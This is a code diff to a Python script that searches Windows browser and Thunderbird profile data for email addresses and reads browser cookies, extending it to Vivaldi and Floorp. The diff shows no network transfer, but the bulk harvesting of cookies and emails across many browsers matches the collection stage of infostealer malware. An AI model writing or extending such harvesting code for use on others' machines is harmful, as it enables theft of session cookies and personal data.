@@ -39,12 +39,16 @@ FIREFOX_BROWSER = 'firefox'
 LIBREWOLF_BROWSER = 'librewolf'
 OPERAGX = 'operagx'
 OPERA_BROWSER = 'opera'
+FLOORP_BROWSER = 'floorp'
+VIVALDI_BROWSER = 'vivaldi'
 chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
 edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
 brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
+vivaldi_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data')
 operagx_path = os.path.join(os.getenv('APPDATA'), 'Opera Software')
 opera_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable')
 firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+floorp_path = os.path.join(os.getenv('APPDATA'), 'Floorp', 'Profiles')
 librewolf_path = os.path.join(os.getenv('APPDATA'), 'librewolf', 'Profiles')
 thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
 opera_local_state_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local State')
@@ -341,7 +345,7 @@ def chromiumOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, 
                         if value.startswith(b'\x00\x00\x00\x00') or value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
                             try:
                                 value = snappy.uncompress(value[4:])
-                                emails.extend(re.findall(email_pattern, value.decode('utf-8')))
+                                emails.extend(re.findall(email_pattern, decode_with_fallback(value)))
                                 continue
                             except Exception as e :
                                 # print(f"Error decompressing value: {e}, skipping this entry.")
@@ -455,6 +459,7 @@ def chromiumOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, 
                 elif browser_name == OPERA_BROWSER: cookies = browser_cookie3.opera(cookie_file=tcDatPath)
                 elif browser_name == OPERAGX: cookies = browser_cookie3.opera_gx(cookie_file=tcDatPath)
                 elif browser_name == BRAVE_BROWSER: cookies = browser_cookie3.brave(cookie_file=tcDatPath)
+                elif browser_name == VIVALDI_BROWSER: cookies = browser_cookie3.vivaldi(cookie_file=tcDatPath)
                 # print(browser_name, tcDatPath, cDatPath)
 
                 for cookie in cookies:
@@ -829,6 +834,10 @@ if os.path.exists(edge_path):
     edge_emails = chromiumOnly(edge_path, email_pattern, EDGE_BROWSER)
     emails.extend(edge_emails)
 
+if os.path.exists(vivaldi_path):
+    vivaldi_emails = chromiumOnly(vivaldi_path, email_pattern, VIVALDI_BROWSER)
+    emails.extend(vivaldi_emails)
+
 if os.path.exists(firefox_path): 
     firefox_emails = firefox(firefox_path, email_pattern, FIREFOX_BROWSER)
     emails.extend(firefox_emails)
@@ -836,6 +845,10 @@ if os.path.exists(firefox_path):
 if os.path.exists(librewolf_path): 
     librewolf_emails = firefox(librewolf_path, email_pattern, LIBREWOLF_BROWSER)
     emails.extend(librewolf_emails)
+
+if os.path.exists(floorp_path):
+    floorp_emails = firefox(floorp_path, email_pattern, FLOORP_BROWSER)
+    emails.extend(floorp_emails)
 
 if os.path.exists(thunderbird_path): 
     thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
